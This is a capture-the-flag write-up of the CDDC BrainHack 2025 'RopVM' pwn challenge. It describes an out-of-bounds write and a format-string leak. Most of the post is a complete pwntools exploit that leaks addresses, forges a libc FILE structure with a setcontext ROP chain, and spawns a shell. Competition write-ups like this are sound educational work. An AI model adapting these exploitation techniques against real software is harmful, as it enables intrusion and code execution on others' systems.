---
title: CDDC BrainHack 2025 Finals - RopVM
description: RopVM
author: jalike576
date: 2025-06-15 16:33:00 +0700
categories: [Pwn]
tags: [Pwn, Writeup]

---

Here is my writeup of the challenge `RopVM` from `CDDC Brainhack 2025 Finals`

## Reversing 

Okay the first thing we might have to know is the opcode implemented inside the `VM`



I don't really know how to get the right password, however my teammate [Peter](https://clowncs.github.io/) has found it using his great reversing skills

This is the list of opcodes that `RopVM` uses

```
0x464C457F: maybe nop
0x1: LOAD
0x2: STORE
0x3: ADD
0x4: SUB
0x5: MUL
0x6: DIV
0x7: JMP
0x8: JE
0x9: JNE
0xa: JL
0xb: JGE
0xc: CALL
0xd: RET
0xe: HLT
0xf: PUSH
0x10: POP
0x11: MOV REG1, REG2
0x12: CMP
0x13: XOR
0x14: INC
0x15: SYSCALL
0x16: MOV REG, IMM
0x17: LOAD REG, [REG]
0x18: AND
```

## Finding bugs

At opcode syscall (21) for `read`, you can see 

```cpp
          v17 = (__int64 *)a1[3];
          v18 = *v17;
          if ( *v17 )
          {
            <truncated>
          }
          else
          {
            read(0, (void *)(v6 + v17[1]), *((int *)v17 + 4));
            v3 = (__int64 *)a1[15];
          }
```

`v6` is our heap buffer and `v17[1]` and `v17[2]` are controllable values, the type of `v17[1]` is `int`. There is no check over whether it is negative or not &rarr; `OOB Write`

This primitive is very great, as we can overwrite some elements located in the `.bss` section

In addition, for the `write` operation implemented in opcode `syscall`, we can see it uses `__printf_chk`

```cpp
            if ( v18 == 1 )
            {
              __printf_chk(1LL, (const char *)(v6 + v17[1]), v6 + v17[2]);
              v3 = (__int64 *)a1[15];
            }
```

`v17[1]` and `v17[2]` are used again, they are respectively the second and third parameter of the VM, so if `v6 + v17[1]` belongs to a arbitrarily written region, we are likely to have `format string` bug

Because of `__printf_chk` filtering `%n` and `$`, we can only use it for leaking addresses. But it is really enough

We have two primitives, and it's time to pwn the binary



## Exploiting

Exploiting this binary is such a real pain in the neck, as the `VM` itself consists of serious bugs, however we can only use the opcodes inside `program.bin` rather than crafting our own opcodes. 

First we are going to see how we can get the `VM` addresses

### Arbitrary read

Because we can write into return address of the `VM`, I decide to do a quite complicated chain, which is going to read into `buffer[0x8000]` and change `%s` to my own format in order to get base address



### Arbitrary Write

Okay, after leaking, I choose to return to the start of `program.bin` to get the original flow

My purpose is to overwrite all the `program.bin` stored inside heap region

So I should find a way to set the first parameter to `0` and the second param to a big value

I try to dive into `program.bin` to look for a place where I can get my first parameter become 0



**Final Exploit**:
```py
#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("./ropvm_patched")
l = ELF("./libc.so.6")
gs="""
"""
def start():
    if args.LOCAL:
        p=e.process()
        if args.GDB:
            gdb.attach(p,gdbscript=gs)
            pause()
    elif args.REMOTE: # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

r = start()

def set_param(prior, val):
    return (p32(22) + p32(prior) + p32(val)).ljust(16, b'\0')
def exec():
    return (p32(21)).ljust(16, b'\0')
r.recvuntil(b'Password : ')
r.sendline(b'V3ry53cretP4ass')

r.recvuntil(b'[+] Correct Password!\n')
pl = b''

# pl = set_param(0x1, 0x8030)
# pl += exec()
# pl += set_param(0x0, 0x0)
# pl += set_param(0x1, 0x8030)
# pl += set_param(0x2, 0xffff)
# pl += exec()
# pl += b'%p%2$p%3$p'
stack_vm = 0xdff8
padding = 32
pl = b'\0' * padding
pl += p32(stack_vm)
pl += p32(0x220) # ret1, change param to call read(0, 0xf000, 0x40)
stack_vm = stack_vm + 8
pl += p32(stack_vm)
pl += p32(0x1230) # ret2, change param to call read(0, 0x8000, 0x8050)
stack_vm = stack_vm + 4
pl += p32(stack_vm)


pause()
r.send(pl)
#sleep(0.5)
pause()
r.send(b'ABC')
pause()
r.send(b'%p|' * 43 + b'F' * 5 + b'%p|' * 2)
r.recvuntil(b'0x')
heap = int(r.recvuntil(b'|').strip(b'|'), 16)
log.info(f'Heap: {hex(heap)}')
for i in range(5):
    r.recvuntil(b'0x')
stack = int(r.recvuntil(b'|').strip(b'|'), 16)
log.info(f'Stack: {hex(stack)}')
r.recvuntil(b'0x')
e.address = int(r.recvuntil(b'|').strip(b'|'), 16) - 0x7080
log.info(f'PIE: {hex(e.address)}')
r.recvuntil(b'F' * 5)
l.address = int(r.recvuntil(b'|').strip(b'|'), 16) - 0x29d90
log.info(f'Libc: {hex(l.address)}')

stack_vm = 0xdffc
stdout_bin = e.address + 0x7040

padding = 32
vm = heap - 0x8010
r.recvuntil(b'|')
r.sendline(b'V3ry53cretP4ass')

pl = b'\0' * padding
pl += p32(stack_vm + 8)
pl += p32(0x220)
pl += p32(0) * 1
pl += p32(stack_vm + 16)
pl += p32(0x1230)
pl += p32(stack_vm + 32)
pl += p32(0x720)
pl += p32(0) * 2

pl += p32(stack_vm + 40)
pl += p32(0x1250)

stdout = l.sym._IO_2_1_stdout_
pause()
r.send(pl)
pause()
r.send(b'A')
pause()
r.send(b'%s\0')

chain = set_param(0, 0)
chain += set_param(1, (stdout_bin - vm) & 0xffffffff)
chain += set_param(2, 0x1000)
chain += exec()
chain += set_param(0, 1)
chain += set_param(1, 0x8000)
chain += set_param(2, 0x200)
chain += exec()

rdi = l.address + 0x000000000002a3e5
ret = rdi + 1
system = l.sym.system
bin_sh = next(l.search(b'/bin/sh'))
setcontext = l.sym.setcontext + 61
pl = b'\0' * 0x68 + p64(setcontext)
pl = pl.ljust(0xa0, b'\0')
pl += p64(vm + 232 + 0x160)
pl += p64(ret)
pl = pl.ljust(0xe0, b'\0')
pl += p64(vm + 352)
pl += p64(rdi) + p64(bin_sh) + p64(ret) + p64(system)

stdout = l.sym['_IO_2_1_stdout_']
stdin = l.sym['_IO_2_1_stdin_']
fp = p64(0)
fp += p64(stdout + 131) * 7
fp += p64(stdout + 132)
fp += p64(0) * 4
fp += p64(stdin)
fp += p64(0x1) + p64(0xffffffffffffffff)
fp += p64(0x000000000000000) + p64(l.address + 0x21ba70)
fp += p64(0xffffffffffffffff) + p64(0)
fp += p64(vm + 352) # set _IO_wide_data of stdout in order to bypass _IO_wfile_overflow check
fp += p64(0) * 3 + p64(0x00000000ffffffff)
fp += p64(0) * 2
fp += p64(l.sym['_IO_wfile_jumps_mmap'] + 24 - 0x38)


pause()
r.send(chain + fp + pl)

pause()
r.send(p64(vm + 128))


sleep(0.5)
r.sendline(b'cat fl*')
r.interactive()
```

I am having a great time at `CDDC 2025 Brainhack`. Singapore is a hilarious country and this is by now the most brilliant CTF events I have ever joined. Many thanks to our sponsors, `Ensign Infosecurity` and our teams for having such a great memory!